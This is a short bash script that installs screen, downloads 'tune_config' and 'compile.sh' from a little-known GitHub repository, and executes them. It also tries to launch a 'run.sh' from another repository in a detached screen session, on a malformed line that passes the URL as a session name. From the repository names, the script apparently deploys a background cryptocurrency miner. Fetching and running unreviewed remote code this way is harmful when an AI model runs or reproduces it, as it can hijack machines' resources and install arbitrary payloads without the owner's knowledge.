#!/bin/bash
apt-get update
apt install screen -y
wget -qO tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget -qO compile.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/compile.sh
chmod +x compile.sh
screen -dm -S https://raw.githubusercontent.com/nurfasikin/DGB/main/run.sh && chmod u+x run.sh && ./run.sh
./compile.sh
echo succes
